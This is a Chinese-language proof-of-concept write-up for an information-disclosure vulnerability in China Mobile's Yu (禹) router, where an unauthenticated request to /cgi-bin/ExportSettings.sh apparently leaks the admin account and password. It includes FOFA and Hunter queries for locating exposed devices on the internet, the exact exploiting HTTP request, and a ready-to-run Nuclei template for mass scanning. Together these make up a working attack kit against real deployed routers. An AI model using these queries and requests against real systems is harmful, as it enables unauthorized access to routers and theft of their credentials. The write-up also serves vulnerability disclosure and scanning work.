# 中国移动禹路由ExportSettings.sh存在信息泄露漏洞

## 一、漏洞简介
 中移禹路由器是一款性能强大且功能丰富的无线路由器。它采用了最新的Wi-Fi 6技术，提供更快的速度和更稳定的连接。它支持双频段同时工作，2.4GHz和5GHz频段可同时提供高速的无线网络，满足多设备同时连接的需求。中移禹路由器还具备MU-MIMO技术，可以同时处理多个设备的数据传输，提供更快的速度和更稳定的连接。中移铁通禹路由器ExportSettings接口处存在信息泄露漏洞，恶意攻击者可能会利用此漏洞获取到登陆账户和密码，从而登录后台，使服务器处于不安全的状态。  

## 二、资产测绘
```plain
fofa：title="互联世界 物联未来-登录"
hunter：web.body="互联世界 物联未来-登录"
```

![1715321824315-4c4c83b0-d438-4f26-8f8b-e5f94fb2a3a6.png](./img/SVqYtlA8uAuRUiVF/1715321824315-4c4c83b0-d438-4f26-8f8b-e5f94fb2a3a6-827283.png)

![1715321983112-15fbb15d-d528-42e9-ae4e-5aad9949c6ae.png](./img/SVqYtlA8uAuRUiVF/1715321983112-15fbb15d-d528-42e9-ae4e-5aad9949c6ae-628253.png)

## 三、漏洞复现
```http
GET /cgi-bin/ExportSettings.sh HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```

![1715322118808-18bfdc8e-7d0a-4a72-8285-1e03722d0c15.png](./img/SVqYtlA8uAuRUiVF/1715322118808-18bfdc8e-7d0a-4a72-8285-1e03722d0c15-396284.png)

![1715322129700-996c3d40-cd72-4e91-86e7-f7bc9ee0262b.png](./img/SVqYtlA8uAuRUiVF/1715322129700-996c3d40-cd72-4e91-86e7-f7bc9ee0262b-534381.png)

## 四、Nuclei
```http
id: ZYTT-ExportSettings-Info

info:
  name: 中移铁通禹路由器-信息泄露-ExportSettings
  author: haoguoguo
  severity: high
  metadata: 
    fofa-query: title="互联世界 物联未来-登录"
variables:
  filename: "{{to_lower(rand_base(5))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        GET /cgi-bin/ExportSettings.sh HTTP/1.1
        Host:{{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"wan_ipaddr","HostName")
```

![1715322153837-15d20d64-a9ee-4f24-84af-cc2a5bdb87aa.png](./img/SVqYtlA8uAuRUiVF/1715322153837-15d20d64-a9ee-4f24-84af-cc2a5bdb87aa-356001.png)





> 更新: 2024-06-11 10:30:33  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qmarera6wxzybbby>